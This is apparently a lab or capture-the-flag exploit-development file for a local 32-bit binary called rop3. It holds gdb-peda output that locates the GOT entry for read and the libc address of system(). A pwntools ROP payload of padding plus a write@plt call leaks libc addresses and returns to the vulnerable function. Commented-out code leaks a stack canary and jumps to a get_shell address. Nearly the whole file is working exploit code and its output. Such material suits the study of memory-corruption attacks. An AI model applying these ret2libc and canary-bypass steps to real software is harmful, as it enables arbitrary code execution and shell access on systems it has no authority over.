'''
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA


gdb-peda$ info functions read@plt
All functions matching regular expression "read@plt":

Non-debugging symbols:
0x08048360  read@plt



root@b6d4ff181a3f:/pwd/vuln4-rop# objdump -R ./rop3 | grep read
0804a000 R_386_JUMP_SLOT   read@GLIBC_2.0

gdb-peda$ tele 0x0804a000
0000| 0x804a000 --> 0xf7ece1a0 (<__GI___libc_read>:     endbr32)
0004| 0x804a004 --> 0xf7ea6770 (<getegid>:      endbr32)
0008| 0x804a008 --> 0x8048386 (<__gmon_start__@plt+6>:  push   0x10)
0012| 0x804a00c --> 0xf7df7ec0 (<__libc_start_main>:    endbr32)
0016| 0x804a010 --> 0x80483a6 (<write@plt+6>:   push   0x20)
0020| 0x804a014 --> 0xf7ea6bd0 (<__GI___setresgid>:     endbr32)
0024| 0x804a018 --> 0x0
0028| 0x804a01c --> 0x0
gdb-peda$ vmmap 0xf7ece1a0
Start      End        Perm      Name
0xf7df6000 0xf7f50000 r-xp      /usr/lib/i386-linux-gnu/libc-2.30.so



gdb-peda$ p system
$1 = {int (const char *)} 0xf7e1e8b0 <__libc_system>
gdb-peda$ p 0xf7ece1a0 - 0xf7e1e8b0
$3 = 0xaf8f0

'''
# 140

from pwn import *
payload = ''.join([
    140 * 'A',          #
    p32(0x80483a0),
    # p32(0xdeadbeef),
    # -----------------
    p32(0x08048474),     # vulnerable_function
    # 'CCCC' ,
    # -----------------
    p32(0x1),
    p32(0x0804a000),
    p32(0x4),
])
print(payload)
# get_shell = p32(0x08049256)
# io = process("./canary")
# io.recvuntil("Hello Hacker!")
# io.sendline("A" * 100)
# io.recvuntil("A" * 100)
# canary = u32(io.recv(4)) - 0x0a
# log.info("canary %x" % canary)
#
#
# payload = "A" * 100 + p32(canary) + "A" * 12 + get_shell
# io.send(payload)
# io.recv()
# io.interactive()

